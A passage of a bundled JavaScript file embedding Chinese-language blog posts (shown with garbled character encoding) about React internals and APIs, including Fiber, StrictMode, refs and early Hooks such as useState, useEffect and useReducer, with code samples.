‡è®°å‡ºéœ€è¦æ¸²æŸ“çš„ç»„ä»¶ï¼Œ\\nè®°å½•åˆ°<code>EffectList</code>ä¸­ã€‚</p>\\n<p><code>React</code>çš„<code>commit</code>é˜¶æ®µé€šè¿‡<code>nextEffect</code>å¯¹<code>EffectList</code>çš„ç»„ä»¶è¿›è¡Œçº¿æ€§å¤„ç†(æ¸²æŸ“)ï¼Œè€Œä¸æ˜¯åœ¨ä¸€æ£µæ ‘å†…éƒ¨å†æ¬¡éå†ã€‚</p>\\n<p>å…¶ä¸­<code>firstEffect</code>å±æ€§æ ‡è®°äº†ä»å“ªä¸ªç»„ä»¶å¼€å§‹æ›´æ–°ï¼Œç„¶åä¸æ–­æ‰§è¡Œ<code>nextEffect</code>å¯¹åº”çš„ç»„ä»¶çš„æ›´æ–°ã€‚</p>\\n<h3 id=\\"can-kao\\">å‚è€ƒ</h3>\\n<ul>\\n<li><a href=\\"https://medium.com/react-in-depth/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react-e1c04700ef6e\\">https://medium.com/react-in-depth/inside-fiber-in-depth-overview-of-the-new-reconciliation-algorithm-in-react-e1c04700ef6e</a></li>\\n<li><a href=\\"https://medium.com/dailyjs/the-how-and-why-on-reacts-usage-of-linked-list-in-fiber-67f1014d0eb7\\">https://medium.com/dailyjs/the-how-and-why-on-reacts-usage-of-linked-list-in-fiber-67f1014d0eb7</a></li>\\n</ul>\\n","toc":[{"anchor":"fiber-de-jie-gou","level":3,"text":"Fiberçš„ç»“æ„"},{"anchor":"fiber-nei-bu-gong-zuo-fang-shi","level":3,"text":"Fiberå†…éƒ¨å·¥ä½œæ–¹å¼"},{"anchor":"fiber-de-render-jie-duan-he-commit-jie-duan","level":3,"text":"Fiberçš„renderé˜¶æ®µå’Œcommité˜¶æ®µ"},{"anchor":"fiber-nei-bu-de-loopï¼Œreact-shi-xian-fei-zu-se-render-de-ao-mi","level":3,"text":"<code>Fiber</code>å†…éƒ¨çš„loopï¼Œ<code>React</code>å®ç°éé˜»å¡<code>render</code>çš„å¥¥ç§˜"},{"anchor":"fiber-de-effectlist","level":3,"text":"<code>Fiber</code>çš„<code>EffectList</code>"},{"anchor":"can-kao","level":3,"text":"å‚è€ƒ"}],"relatedTags":null,"created_at":"2018-11-28","timeArr":[2018,10,28,0,0,0,0],"title":"React-Fiberç®€è¿°","uuid":"b1f5ca61aa11b54e8e854bd3c67096d01428d37b","summary":"<p><code>Fiber</code>å¯ä»¥çœ‹æˆä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒå†…éƒ¨åŒ…å«äº†å¯¹å½“å‰ç»„ä»¶çš„è¡Œä¸ºï¼ŒåŒ…æ‹¬å¯¹ç»„ä»¶è¡Œä¸ºçš„è·Ÿè¸ªã€å®‰æ’ã€æš‚åœå’Œå–æ¶ˆã€‚</p>","slug":"React-Fiber-jian-shu","sha":"0577a959c7299927efbe8e15eb104f1a45ad84ee"}')},563:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"strict-mode\\">Strict Mode</h4>\\n<p>åœ¨React v16.3æ—¶æ·»åŠ ï¼Œç›®çš„æ˜¯å¸®åŠ©æ‰¾å‡ºåº”ç”¨ä¸­æ½œåœ¨çš„é—®é¢˜ã€‚</p>\\n<p>ä½¿ç”¨ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> React <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'react\'</span>;\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">ExampleApplication</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> (\\n    &lt;div&gt;\\n      &lt;Header /&gt;\\n      &lt;React.StrictMode&gt;\\n        &lt;div&gt;\\n          &lt;ComponentOne /&gt;\\n          &lt;ComponentTwo /&gt;\\n        &lt;/div&gt;\\n      &lt;/React.StrictMode&gt;\\n      &lt;Footer /&gt;\\n    &lt;/div&gt;\\n  );\\n}</code></pre></code></pre>\\n<hr>\\n<p>ç®€å•æ€»ç»“ï¼š</p>\\n<p>StrictModeç›®å‰æœ‰åŠ©äº</p>\\n<ul>\\n<li>è¯†åˆ«å…·æœ‰ä¸å®‰å…¨ç”Ÿå‘½å‘¨æœŸçš„ç»„ä»¶</li>\\n<li>æœ‰å…³æ—§å¼å­—ç¬¦ä¸²<code>ref</code>ç”¨æ³•çš„è­¦å‘Š</li>\\n<li>æœ‰å…³<code>findDOMNode</code>ä½¿ç”¨çš„è­¦å‘Š</li>\\n<li>æ£€æµ‹æ„å¤–çš„å‰¯ä½œç”¨</li>\\n<li>æ£€æµ‹æ˜¯å¦æœ‰æ—§çš„<code>context</code>API</li>\\n</ul>\\n<ol>\\n<li><p>è¯†åˆ«å…·æœ‰ä¸å®‰å…¨ç”Ÿå‘½å‘¨æœŸçš„ç»„ä»¶</p>\\n<p> æ£€æµ‹æ˜¯å¦ä½¿ç”¨å·²ç»åˆ—å…¥åºŸå¼ƒçš„ç”Ÿå‘½å‘¨æœŸ(æ£€æµ‹ç¬¬ä¸‰æ–¹å·¥å…·å¾ˆæ–¹ä¾¿)ã€‚</p>\\n</li>\\n<li><p>æœ‰å…³æ—§å¼å­—ç¬¦ä¸²<code>ref</code>ç”¨æ³•çš„è­¦å‘Š</p>\\n<p> <code>ref</code>å­—ç¬¦ä¸²è™½ç„¶æ–¹ä¾¿ï¼Œä½†æœ‰è®¸å¤š<a href=\\"https://github.com/facebook/react/issues/1373\\">ç¼ºé™·</a></p>\\n<p> æ£€æµ‹æ˜¯å¦ä½¿ç”¨äº†<code>ref</code>å­—ç¬¦ä¸²ã€‚</p>\\n</li>\\n<li><p>æœ‰å…³<code>findDOMNode</code>ä½¿ç”¨çš„è­¦å‘Š</p>\\n<p> å¦‚æœéœ€è¦è·å–DOMå…ƒç´ å¼•ç”¨ï¼Œä¼˜å…ˆä½¿ç”¨refï¼Œè€Œä¸æ˜¯<code>findDOMNode</code>ã€‚</p>\\n<p> ç¬¬ä¸€ã€å› ä¸ºå½“ä½¿ç”¨äº†<Fragment>çš„æ—¶å€™ï¼Œ<code>findDOMNode</code>åªä¼šå¼•ç”¨åˆ°ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œè€Œå½“æ—¶æ¸²æŸ“çš„å…ƒç´ å¯èƒ½æœ‰å¾ˆå¤šã€‚</p>\\n<p> ç¬¬äºŒã€<code>findDOMNode</code>æ˜¯ä¸€ä¸ªä¸€æ¬¡æ€§çš„è°ƒç”¨ï¼Œå½“æ¸²æŸ“å…ƒç´ æ”¹å˜ï¼Œå®ƒ(ä¹‹å‰çš„ç»“æœ)å¹¶ä¸ä¼šæ”¹å˜ã€‚</p>\\n</li>\\n<li><p>æ£€æµ‹æ„å¤–çš„å‰¯ä½œç”¨</p>\\n<p> Reactæ›´æ–°ä¼šç»è¿‡2ä¸ªé˜¶æ®µ</p>\\n<ul>\\n<li><p><code>render</code> è¿™ä¸ªé˜¶æ®µä¼šå†³å®šå“ªäº›éœ€è¦æ›´æ–°ã€‚</p>\\n</li>\\n<li><p><code>commit</code> è¿™ä¸ªé˜¶æ®µä¼šæ‰§è¡Œæ›´æ–°ã€‚</p>\\n<p>å…¶ä¸­<code>render</code>é˜¶æ®µå¾ˆæ…¢(ç›¸å¯¹)ï¼Œå› æ­¤æœªæ¥çš„<code>async mode</code>ä¼šå°†<code>render</code>é˜¶æ®µåˆ†å‰²æˆè®¸å¤šå°å—ã€‚</p>\\n<p>å› æ­¤åœ¨<code>render</code>é˜¶æ®µçš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°æœ‰å¯èƒ½ä¼šé‡å¤æ‰§è¡Œã€‚</p>\\n<p>è€Œè¿™ä¸ªæ£€æµ‹åŠŸèƒ½ï¼Œä¼šæœ‰æ„è¿›è¡ŒåŒè°ƒç”¨ï¼Œå¦‚æœ<code>render</code>é˜¶æ®µä¸æ˜¯ä¸€è‡´çš„ç»“æœï¼Œåˆ™æœ‰å¯èƒ½æ›´å®¹æ˜“å‘ç°bugã€‚</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>æ£€æµ‹æ˜¯å¦æœ‰æ—§çš„<code>context</code>API</p>\\n<p> æ—§çš„<code>context</code>APIæ›´å®¹æ˜“å‡ºç°bugã€‚</p>\\n</li>\\n</ol>\\n","toc":[{"anchor":"strict-mode","level":4,"text":"Strict Mode"}],"relatedTags":null,"created_at":"2018-10-30","timeArr":[2018,9,30,0,0,0,0],"title":"Reactçš„Strict Mode","uuid":"8cf3eb3203db34468cc1b1507b0c244e16cbf3ab","summary":"<h4>Strict Mode</h4>\\n<p>åœ¨React v16.3æ—¶æ·»åŠ ï¼Œç›®çš„æ˜¯å¸®åŠ©æ‰¾å‡ºåº”ç”¨ä¸­æ½œåœ¨çš„é—®é¢˜ã€‚</p>\\n<p>ä½¿ç”¨ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> React <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'react\'</span>;\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">ExampleApplication</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n  <span class=\\"hljs-keyword\\">return</span> (\\n    &lt;div&gt;\\n      &lt;Header /&gt;...</code></pre>","slug":"React-de-Strict-Mode","sha":"041680b86309bc84db432c597afbaf572d179c1f"}')},564:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"createref\\">createRef</h3>\\n<p>å½“ ref å±æ€§åœ¨ç»„ä»¶æ—¶ï¼Œè·å–ç»„ä»¶å®ä¾‹ï¼›å½“refå±æ€§åœ¨domæ—¶ï¼Œè·å–domå®ä¾‹</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">MyComponent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props) {\\n    <span class=\\"hljs-keyword\\">super</span>(props);\\n\\n    <span class=\\"hljs-keyword\\">this</span>.inputRef = React.createRef();\\n  }\\n\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> &lt;input type=\\"text\\" ref={this.inputRef} /&gt;;\\n  }\\n\\n  componentDidMount() {\\n    <span class=\\"hljs-keyword\\">this</span>.inputRef.current.focus();\\n  }\\n}</code></pre></code></pre>\\n<h3 id=\\"finddomnode\\">findDOMNode</h3>\\n<p>è·å–findDOMNode(this)å‚æ•°ç»„ä»¶(this)çš„DOMï¼ˆæ‰€æœ‰DOMï¼‰</p>\\n<p>å¦‚æœåªæ˜¯FragmentåŒ…è£¹ï¼Œåˆ™åªèƒ½è·å–å…¶ç¬¬ä¸€ä¸ªå­ç»„ä»¶çš„DOM</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<p>è·å–çš„ç¬¬ä¸€ä¸ªå­ç»„ä»¶çš„DOMï¼š<code>&lt;div&gt;1&lt;/div&gt;</code></p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;Fragment&gt;\\n    &lt;div&gt;1&lt;/div&gt;\\n    &lt;div&gt;2&lt;/div&gt;\\n&lt;<span class=\\"hljs-regexp\\">/Fragment&gt;</span></code></pre></code></pre>\\n<p>è·å–çš„ç¬¬ä¸€ä¸ªå­ç»„ä»¶çš„DOMï¼š<code>&lt;div&gt;&lt;div&gt;1&lt;/div&gt;&lt;div&gt;2&lt;/div&gt;&lt;/div&gt;</code></p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;Fragment&gt;\\n    &lt;div&gt;\\n        &lt;div&gt;1&lt;/div&gt;\\n        &lt;div&gt;2&lt;/div&gt;\\n    &lt;/div&gt;\\n&lt;<span class=\\"hljs-regexp\\">/Fragment&gt;</span></code></pre></code></pre>\\n<h3 id=\\"forwardref\\">forwardRef</h3>\\n<p>ç”¨æ³•ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Child=React.forwardRef(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">props,ref</span>)=&gt;</span>(\\n    &lt;div&gt;\\n        &lt;span ref={ref}&gt;child&lt;/span&gt;\\n    &lt;/div&gt;\\n))</code></pre></code></pre>\\n<p>é€šè¿‡ä¸Šé¢åŒ…è£¹åï¼Œ</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">Parent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span></span>{\\n    <span class=\\"hljs-comment\\">//...</span>\\n\\n    <span class=\\"hljs-keyword\\">this</span>.myRef=React.createRef();\\n\\n    &lt;Child ref={this.myRef} /&gt;\\n}</code></pre></code></pre>\\n<p>è™½ç„¶refåœ¨ç»„ä»¶ä¸Šï¼Œä½†è¿˜æ˜¯èƒ½è·å–åˆ°Childçš„span.</p>\\n<p>å¦ä¸€ç§ç”¨æ³•ï¼šè·å–çš„æ˜¯input</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Child= React.forwardRef(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">props,ref</span>)=&gt;</span>{\\n    <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">GrandChild</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span></span>{\\n        render(){\\n            <span class=\\"hljs-keyword\\">return</span> (\\n                &lt;input ref={ref}/&gt;\\n            )\\n        }\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> (\\n        &lt;div &gt;\\n            child\\n            {props.children}\\n            &lt;GrandChild /&gt;\\n        &lt;/div&gt;\\n    )\\n})\\n</code></pre></code></pre>\\n","toc":[{"anchor":"createref","level":3,"text":"createRef"},{"anchor":"finddomnode","level":3,"text":"findDOMNode"},{"anchor":"forwardref","level":3,"text":"forwardRef"}],"relatedTags":null,"created_at":"2018-06-08","timeArr":[2018,5,8,0,0,0,0],"title":"Reactè·å–DOM","uuid":"8fb9804dd71b929b0e5256563c63f9d6c48d95b2","summary":"<h4>createRef</h4>\\n<p>å½“ ref å±æ€§åœ¨ç»„ä»¶æ—¶ï¼Œè·å–ç»„ä»¶å®ä¾‹ï¼›å½“refå±æ€§åœ¨domæ—¶ï¼Œè·å–domå®ä¾‹</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">MyComponent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(props) {\\n    <span class=\\"hljs-keyword\\">super</span>(props);\\n\\n    <span class=\\"hljs-keyword\\">this</span>.inp...</code></pre>","slug":"React-huo-qu-DOM","sha":"584a1de3b3d076a60c2ae132c0b6ae9e4451ad42"}')},565:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"hooks\\">Hooks</h4>\\n<p><code>useState, useEffect, useContext</code></p>\\n<hr>\\n<ul>\\n<li>useState:</li>\\n</ul>\\n<ol>\\n<li><p>å¯ä»¥åœ¨éclassä½¿ç”¨state</p>\\n</li>\\n<li><p>è¿”å›ä¸€ä¸ªæ•°ç»„</p>\\n<p> arr[0]æ˜¯å…·ä½“çš„state</p>\\n<p> arr[1]æ˜¯æ”¹å˜stateçš„æ–¹æ³•</p>\\n<p> <code>const [count, setCount] = useState(initialCount);</code></p>\\n</li>\\n<li><p>ä¸åƒthis.setStateï¼ŒuseStateä¸èƒ½åˆå¹¶stateï¼Œä¾‹å¦‚</p>\\n<p> <code>state={x:1,y:2}  set({x:3}) ===&gt; state={x:3}</code></p>\\n<p> <code>state={x:1,y:2} this.setState({x:3})===&gt;state={x:3,y:2}</code></p>\\n</li>\\n<li><p>åˆå§‹åŒ–åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå› æ­¤ä¸€äº›æ˜‚è´µçš„æ“ä½œåº”è¯¥æ”¾åˆ°åˆå§‹åŒ–æ‰§è¡Œï¼Œä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">const</span> [state, setState] = useState(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n   <span class=\\"hljs-keyword\\">const</span> initialState = someExpensiveComputation(props);\\n   <span class=\\"hljs-keyword\\">return</span> initialState;\\n });</code></pre></code></pre>\\n</li>\\n</ol>\\n<hr>\\n<ul>\\n<li>useEffect:</li>\\n</ul>\\n<p>å‡½æ•°å¼ç»„ä»¶ä¸»ä½“éƒ½æ˜¯æŒ‚è½½åœ¨renderï¼Œä½¿ç”¨å‰¯ä½œç”¨æ“ä½œä¼šæœ‰ä¸€äº›æ„å¤–bugå‘ç”Ÿã€‚</p>\\n<p>ä½†å¯ä»¥åœ¨useEffectå†…éƒ¨æ‰§è¡Œï¼Œè¿™ä¸ªé’©å­åœ¨renderä¹‹åæ‰æ‰§è¡Œã€‚</p>\\n<ol>\\n<li><p>useEffectçš„è¿”å›å€¼ä¼šåœ¨unmountä¹‹å‰æ‰§è¡Œ</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> useEffect(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n   <span class=\\"hljs-keyword\\">const</span> subscription = props.source.subscribe();\\n   <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n     <span class=\\"hljs-comment\\">// Clean up the subscription</span>\\n     subscription.unsubscribe();\\n   };\\n });</code></pre></code></pre>\\n</li>\\n<li><p>useEffectç¬¬äºŒä¸ªå‚æ•°(array)ï¼Œè§„å®šçš„æ•°æ®å‘ç”Ÿå˜åŒ–æ‰ä¼šæ‰§è¡Œ</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> useEffect(\\n   <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n     <span class=\\"hljs-keyword\\">const</span> subscription = props.source.subscribe();\\n     <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n       subscription.unsubscribe();\\n     };\\n   },\\n   [props.source],\\n );</code></pre></code></pre>\\n</li>\\n</ol>\\n<hr>\\n<ul>\\n<li>useContext:</li>\\n</ul>\\n<p>å’Œ<code>static contextType</code>å¾ˆåƒ</p>\\n<p><code>const context = useContext(Context);</code></p>\\n<p>ä¸€è¡Œä»£ç ä»£æ›¿äº†</p>\\n<pre><code><pre class=\\"hljs\\"><code>&lt;Context.Provider&gt;\\n&lt;Context.Consumer&gt;</code></pre></code></pre>","toc":[{"anchor":"hooks","level":4,"text":"Hooks"}],"relatedTags":null,"created_at":"2018-10-29","timeArr":[2018,9,29,0,0,0,0],"title":"React v16.7 Hooks(1)","uuid":"f38c0d6abc75ce713d9bcd733aa66d5097d25e56","summary":"<h4>Hooks</h4>\\n<p><code>useState, useEffect, useContext</code></p>","slug":"React-v16.7-Hooks(1)","sha":"fc32341fa1074291a622a829343b7b8a33955b7c"}')},566:function(n){n.exports=JSON.parse('{"content":"<p><code>useCallback, useMemo, useRef, useImperativeMethods, useMutationEffect, useLayoutEffect</code></p>\\n<hr>\\n<ul>\\n<li><p>useCallback</p>\\n</li>\\n<li><p>useMemo</p>\\n</li>\\n</ul>\\n<p><code>useCallback(fn, inputs) is equivalent to useMemo(() =&gt; fn, inputs)</code></p>\\n<p>æ ¹æ®inputsçš„å†…å®¹åˆ¤æ–­æ˜¯å¦æ‰§è¡Œç¼“å­˜ã€‚</p>\\n<p>å¾…æ›´æ–°ï¼š</p>\\n<p>ä¸<code>shouldComponentUpdate</code>æ­é…</p>\\n<ul>\\n<li>useRef</li>\\n</ul>\\n<ol>\\n<li><p>å¯ä»¥å½“æˆclassä¸­çš„refå±æ€§ä½¿ç”¨ï¼Œä¸<code>React.createRef()</code>ç±»ä¼¼ï¼Œå¼•ç”¨å€¼æ”¾åœ¨<code>.current</code>å±æ€§ä¸‹ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">TextInputWithFocusButton</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n   <span class=\\"hljs-keyword\\">const</span> inputEl = useRef(<span class=\\"hljs-literal\\">null</span>);\\n   <span class=\\"hljs-keyword\\">const</span> onButtonClick = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n     <span class=\\"hljs-comment\\">// `current` points to the mounted text input element</span>\\n     inputEl.current.focus();\\n   };\\n   <span class=\\"hljs-keyword\\">return</span> (\\n     &lt;&gt;\\n       &lt;input ref={inputEl} type=\\"text\\" /&gt;\\n       &lt;button onClick={onButtonClick}&gt;Focus the input&lt;/button&gt;\\n     &lt;/&gt;\\n   );\\n }</code></pre></code></pre>\\n</li>\\n<li><p>å¯ä»¥å½“æˆ<code>instance fields in class</code>ä½¿ç”¨ï¼Œç±»ä¼¼äº<code>this.xxx</code>ï¼Œä¿ç•™ä»»ä½•å˜é‡ã€‚</p>\\n</li>\\n</ol>\\n<ul>\\n<li>useImperativeMethods</li>\\n</ul>\\n<p>è‡ªå®šä¹‰å¹¶ä¸”æš´éœ²ä¸€ä¸ª<code>ref</code>å®ä¾‹çš„æ–¹æ³•åˆ°çˆ¶å…ƒç´ ï¼Œä¸€èˆ¬æ­é…<code>forwardRef</code>ä½¿ç”¨ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">FancyInput</span>(<span class=\\"hljs-params\\">props, ref</span>) </span>{\\n  <span class=\\"hljs-keyword\\">const</span> inputRef = useRef();\\n  useImperativeMethods(ref, () =&gt; ({\\n    <span class=\\"hljs-attr\\">focus</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n      inputRef.current.focus();\\n    }\\n  }));\\n  <span class=\\"hljs-keyword\\">return</span> &lt;input ref={inputRef} ... /&gt;;\\n}\\nFancyInput = forwardRef(FancyInput);</code></pre></code></pre>\\n<p>å½“çˆ¶å…ƒç´ è¿™ä¹ˆè°ƒç”¨<code>&lt;FancyInput ref={fancyInputRef} /&gt;</code>ï¼Œ<code>fancyInputRef.current</code>å°±å­˜åœ¨<code>focus</code>æ–¹æ³•ã€‚</p>\\n<ul>\\n<li>useMutationEffect</li>\\n</ul>\\n<p>ç›¸å½“äº<code>useEffect</code>åœ¨Reactæ‰§è¡ŒDOMæ›´æ–°çš„æ—¶å€™åŒæ­¥è°ƒç”¨ã€‚</p>\\n<ul>\\n<li>useLayoutEffect</li>\\n</ul>\\n<p>ç›¸å½“äº<code>useEffect</code>åœ¨Reactæ‰§è¡ŒDOMæ›´æ–°ç»“æŸçš„æ—¶å€™åŒæ­¥è°ƒç”¨ã€‚</p>\\n<p>æœ‰ç‚¹åƒ<code>componentDidUpdate</code></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-31","timeArr":[2018,9,31,0,0,0,0],"title":"React v16.7 Hooks(2)","uuid":"98dd615567b3aca2beb98ad1d65b71331760149b","summary":"<p><code>useCallback, useMemo, useRef, useImperativeMethods, useMutationEffect, useLayoutEffect</code></p>","slug":"React-v16.7-Hooks(2)","sha":"4f37e4ca6137a17d6454b46239f1712d981ecdc7"}')},567:function(n){n.exports=JSON.parse('{"content":"<p>useReducer</p>\\n<p>æ¨¡æ‹Ÿreducer</p>\\n<p><code>const [state, dispatch] = useReducer(reducer, initialState, initialAction);</code></p>\\n<ul>\\n<li>å‚æ•°1<code>reducer</code> </li>\\n</ul>\\n<p>ä¸<code>redux</code>å†™æ³•ç›¸æ¯”ï¼Œä¸éœ€è¦é»˜è®¤è¿”å›å€¼</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">reducer</span>(<span class=\\"hljs-params\\">state, action</span>) </span>{\\n  <span class=\\"hljs-keyword\\">switch</span> (action.type) {\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'reset\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> initialState;\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'increment\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">count</span>: state.count + <span class=\\"hljs-number\\">1</span>};\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'decrement\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">count</span>: state.count - <span class=\\"hljs-number\\">1</span>};\\n  }\\n}</code></pre></code></pre>\\n<ul>\\n<li>å‚æ•°2 <code>initialState</code></li>\\n</ul>\\n<p>é»˜è®¤æ¸²æŸ“åçš„åˆå§‹å€¼ï¼Œæœ‰ç‚¹ç±»ä¼¼<code>componentDidMount</code>ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œçš„æ—¶å€™è§¦å‘</p>\\n<ul>\\n<li>å‚æ•°3 <code>initialAction</code></li>\\n</ul>\\n<p>å½“æ‰§è¡Œè§¦å‘åï¼Œä¼šç«‹åˆ»æ‰§è¡Œè¿™ä¸ªactionã€‚</p>\\n<p>å®˜ç½‘ä¾‹å­ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> { render } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\\"react-dom\\"</span>;\\n<span class=\\"hljs-keyword\\">import</span> React, { Component, useState,useReducer } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\\"react\\"</span>;\\n\\n<span class=\\"hljs-keyword\\">const</span> initialState = { <span class=\\"hljs-attr\\">count</span>: <span class=\\"hljs-number\\">0</span> };\\n\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">reducer</span>(<span class=\\"hljs-params\\">state, action</span>) </span>{\\n  <span class=\\"hljs-keyword\\">switch</span> (action.type) {\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'reset\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> { <span class=\\"hljs-attr\\">count</span>: action.payload };\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'increment\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> { <span class=\\"hljs-attr\\">count</span>: state.count + <span class=\\"hljs-number\\">1</span> };\\n    <span class=\\"hljs-keyword\\">case</span> <span class=\\"hljs-string\\">\'decrement\'</span>:\\n      <span class=\\"hljs-keyword\\">return</span> { <span class=\\"hljs-attr\\">count</span>: state.count - <span class=\\"hljs-number\\">1</span> };\\n  }\\n}\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">Counter</span>(<span class=\\"hljs-params\\">{ initialCount }</span>) </span>{\\n  <span class=\\"hljs-keyword\\">const</span> [state, dispatch] = useReducer(\\n    reducer,\\n    initialState,\\n    { <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'reset\'</span>, <span class=\\"hljs-attr\\">payload</span>: initialCount },\\n  );\\n  <span class=\\"hljs-keyword\\">return</span> (\\n    &lt;React.Fragment&gt;\\n      Count: {state.count}\\n      &lt;button\\n        onClick={() =&gt; dispatch({ type: \'reset\', payload: initialCount||initialState.count })}&gt;\\n        Reset\\n      &lt;/button&gt;\\n      &lt;button onClick={() =&gt; dispatch({ type: \'increment\' })}&gt;+&lt;/button&gt;\\n      &lt;button onClick={() =&gt; dispatch({ type: \'decrement\' })}&gt;-&lt;/button&gt;\\n    &lt;/React.Fragment&gt;\\n  );\\n}\\nrender(&lt;Counter initialCount={5} /&gt;, <span class=\\"hljs-built_in\\">document</span>.getElementById(<span class=\\"hljs-string\\">\\"root\\"</span>));</code></pre></code></pre>\\n<ol>\\n<li>è¿™é‡Œ<code>Counter</code>æ¥å—ä¸€ä¸ª<code>initialCount</code>çš„propï¼Œæ­¤å¤„è®¾å®šä¸º5ã€‚</li>\\n<li>è¿™é‡Œç¬¬2ä¸ªå‚æ•°<code>initialState</code>è®¾ç½®ä¸º<code>{ count: 0 }</code>ï¼Œè¯´æ˜åˆå§‹åŠ è½½åï¼Œæ˜¾ç¤ºä¸º0ã€‚</li>\\n<li>è¿™é‡Œç¬¬3ä¸ªå‚æ•°<code>initialAction</code>æ˜¯<code>{ type: &#39;reset&#39;, payload: initialCount }</code>ï¼Œè¯´æ˜å½“ç»„ä»¶åŠ 